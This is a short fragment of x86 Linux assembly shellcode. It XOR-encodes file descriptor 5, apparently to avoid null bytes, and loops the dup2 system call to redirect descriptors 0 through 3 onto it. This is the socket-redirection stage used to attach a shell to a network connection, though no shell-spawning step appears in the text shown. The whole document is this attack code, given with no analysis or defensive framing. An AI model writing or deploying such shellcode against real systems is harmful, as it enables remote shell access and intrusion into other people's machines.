.section .text
.global _start

_start:
    movl $0x05 ^ 0x11111111, %edi
    xor $0x11111111, %edi
    xor %ecx, %ecx #int newfd
dup2:
    xor %eax, %eax
    movb $0x3f, %al # sys_dup2(int oldfd, int newfd)
    mov %edi, %ebx #int olddf
    int $0x80
    inc %ecx
    cmp $0x04, %ecx
    jnz dup2

